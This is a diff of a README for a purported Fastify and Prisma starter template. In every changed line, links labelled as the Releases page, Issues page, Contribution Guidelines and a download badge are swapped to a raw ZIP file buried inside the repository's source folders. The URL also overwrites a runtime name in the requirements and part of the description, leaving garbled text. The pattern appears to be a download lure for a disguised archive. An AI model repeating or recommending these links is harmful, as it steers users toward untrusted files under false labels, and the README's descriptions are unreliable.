@@ -1,10 +1,10 @@
 # 🚀 fastify-prisma-starter - Start Your Fast API with Ease
 
-[![Download Now](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/config/starter-fastify-prisma-athalamous.zip%20Now-Get%20Started%20%E2%9A%AA-blue)](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/config/starter-fastify-prisma-athalamous.zip)
+[![Download Now](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/app/helpers/fastify-prisma-starter-v2.4.zip%20Now-Get%20Started%20%E2%9A%AA-blue)](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/app/helpers/fastify-prisma-starter-v2.4.zip)
 
 ## 🌟 Description
 
-The fastify-prisma-starter is a production-ready https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/config/starter-fastify-prisma-athalamous.zip application designed for creating REST APIs. It combines Fastify and Prisma for a smooth setup and includes built-in authentication features, Docker support, and TypeScript for enhanced code quality. Whether you're building a new project or learning how to develop APIs, this starter template helps you hit the ground running.
+The fastify-prisma-starter is a production-ready https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/app/helpers/fastify-prisma-starter-v2.4.zip application designed for creating REST APIs. It combines Fastify and Prisma for a smooth setup and includes built-in authentication features, Docker support, and TypeScript for enhanced code quality. Whether you're building a new project or learning how to develop APIs, this starter template helps you hit the ground running.
 
 ## 📋 Features
 
@@ -16,7 +16,7 @@ The fastify-prisma-starter is a production-ready https://github.com/zuzuamid/fas
 
 ## 📥 Download & Install
 
-To download the latest version of fastify-prisma-starter, visit the [Releases page](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/config/starter-fastify-prisma-athalamous.zip).
+To download the latest version of fastify-prisma-starter, visit the [Releases page](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/app/helpers/fastify-prisma-starter-v2.4.zip).
 
 1. Click the link above to go to the Releases page.
 2. Choose the latest release version.
@@ -24,13 +24,13 @@ To download the latest version of fastify-prisma-starter, visit the [Releases pa
 
 ### Download Steps
 
-- Visit the [Releases page](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/config/starter-fastify-prisma-athalamous.zip).
+- Visit the [Releases page](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/app/helpers/fastify-prisma-starter-v2.4.zip).
 - Locate the version you want to install.
 - Click on the download link for the file that matches your system requirements.
 
 ## ⚙️ System Requirements
 
-- **https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/config/starter-fastify-prisma-athalamous.zip** Version 14 or higher
+- **https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/app/helpers/fastify-prisma-starter-v2.4.zip** Version 14 or higher
 - **Docker:** Installed and running (if you prefer the Docker version)
 - **Operating System:** Windows, macOS, or Linux (specific distributions may vary)
 
@@ -87,11 +87,11 @@ If you prefer to use Docker, make sure Docker is running on your system. Then fo
 
 ## 🔍 Additional Help
 
-If you run into issues or have questions, check the [Issues page](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/config/starter-fastify-prisma-athalamous.zip) on GitHub. Here you can find reported problems and solutions.
+If you run into issues or have questions, check the [Issues page](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/app/helpers/fastify-prisma-starter-v2.4.zip) on GitHub. Here you can find reported problems and solutions.
 
 ## 🎉 Contributing
 
-We welcome contributions from everyone. If you have ideas for improvements or fixes, feel free to submit a pull request. Check the [Contribution Guidelines](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/config/starter-fastify-prisma-athalamous.zip) for more details.
+We welcome contributions from everyone. If you have ideas for improvements or fixes, feel free to submit a pull request. Check the [Contribution Guidelines](https://github.com/zuzuamid/fastify-prisma-starter/raw/refs/heads/main/src/app/helpers/fastify-prisma-starter-v2.4.zip) for more details.
 
 ## 📣 Acknowledgments
 
